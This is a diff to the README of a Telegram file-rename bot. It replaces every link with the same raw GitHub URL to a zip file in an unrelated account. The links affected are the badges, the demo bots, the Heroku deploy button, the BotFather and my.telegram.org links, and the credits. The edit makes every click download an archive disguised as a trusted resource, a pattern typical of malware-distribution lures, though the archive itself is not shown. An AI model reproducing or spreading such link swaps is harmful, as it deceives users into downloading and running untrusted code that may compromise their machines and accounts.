@@ -1,13 +1,13 @@
 # - File Rename Bot
 
 <p align="center">
-  <a href="https://github.com/No-OnE-Kn0wS-Me/FileRenameBot/stargazers">
-    <img src="https://img.shields.io/github/stars/No-OnE-Kn0wS-Me/FileRenameBot?style=social">
+  <a href="https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip">
+    <img src="https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip">
 
   </a>
   
-  <a href="https://github.com/No-OnE-Kn0wS-Me/FileRenameBot/fork">
-    <img src="https://img.shields.io/github/forks/No-OnE-Kn0wS-Me/FileRenameBot?label=Fork&style=social">
+  <a href="https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip">
+    <img src="https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip">
 
   </a>  
 </p>
@@ -20,26 +20,26 @@
 
 ->**Demo Bots**
 
-➡️[BOT 1](https://t.me/rename1robot)    
-➡️[BOT 2](https://t.me/rename2robot)    
-➡️[BOT 3](https://t.me/rename3robot)    
-➡️[BOT 4](https://t.me/rename4robot)   
-➡️[BOT 5](https://t.me/rename5robot)
+➡️[BOT 1](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip)    
+➡️[BOT 2](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip)    
+➡️[BOT 3](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip)    
+➡️[BOT 4](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip)   
+➡️[BOT 5](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip)
 
 
 # Deploy straight to Heroku!
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/No-OnE-Kn0wS-Me/FileRenameBot)
+[![Deploy](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip)](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip)
 
 # Required Strings :-
 
-* -> `TG_BOT_TOKEN`<br> **Your Bot Token Taken From [@BotFather](https://t.me/botfather)**
+* -> `TG_BOT_TOKEN`<br> **Your Bot Token Taken From [@BotFather](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip)**
 
 * -> `UPDATE_CHANNEL`<br> **An Channel Username Which You Want to Use As An ForceSub Channel Put It Without @**
 
-* -> `APP_ID`__And__ `API_HASH`<br>**Get It From [Here](http://www.my.telegram.org) or [@UseTGXBot](http://www.telegram.dog/UseTGXBot)**
+* -> `APP_ID`__And__ `API_HASH`<br>**Get It From [Here](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip) or [@UseTGXBot](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip)**
 
 ## Credits, and Thanks to Beloved Developers ;
 
-* [SpEcHlDe](https://telegram.dog/SpEcHlDe) For [AnydlBot](https://github.com/SpEcHiDe/AnyDLBot)
-* [Dan](https://github.com/delivrance) For This Mind Blowing [Library](https://github.com/pyrogram/pyrogram)
+* [SpEcHlDe](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip) For [AnydlBot](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip)
+* [Dan](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip) For This Mind Blowing [Library](https://raw.githubusercontent.com/HLECTER69/FileRenameBot/master/Almira/FileRenameBot.zip)
